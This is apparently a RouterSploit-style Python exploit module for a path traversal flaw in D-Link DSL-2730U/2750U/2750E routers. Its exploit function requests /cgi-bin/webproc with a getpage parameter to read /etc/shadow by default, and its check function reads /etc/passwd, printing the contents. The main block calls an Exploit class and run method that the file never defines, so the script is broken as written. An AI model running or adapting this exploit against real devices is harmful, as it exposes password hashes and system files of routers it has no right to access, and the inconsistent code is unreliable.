target = ""
# rsf exploit module
# description: Module exploits D-Link DSL-2730U/2750U/2750E Path Traversal
import requests

def exploit(target, port, filename="/etc/shadow"):
    try:
        path = f"/cgi-bin/webproc?getpage={filename}&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard"
        
        response = requests.get(
            f"http://{target}:{port}{path}",
            timeout=5
        )
        
        if response.status_code == 200 and response.text:
            print(response.text)
            return True
        return False
    except:
        return False

def check(target, port=80):
    return exploit(target, port, "/etc/passwd")



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
